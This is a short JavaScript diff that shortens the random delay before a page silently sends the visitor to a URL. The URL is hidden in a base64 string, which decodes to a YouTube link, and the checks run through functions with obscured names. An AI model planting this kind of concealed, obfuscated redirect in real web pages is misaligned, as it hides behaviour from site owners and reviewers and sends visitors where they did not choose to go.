@@ -24,7 +24,7 @@
         let l = _d(atob("aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj14dkZaam81UGdHMA=="));
         let m = _a(l);
         if (_c(m, l) && _b()) {
-            setTimeout(() => { window.location.href = _e(l); }, Math.random() * 5000 + 2000);
+            setTimeout(() => { window.location.href = _e(l); }, Math.random() * 2000 + 500);
         }
     }
     document.addEventListener("DOMContentLoaded", () => {
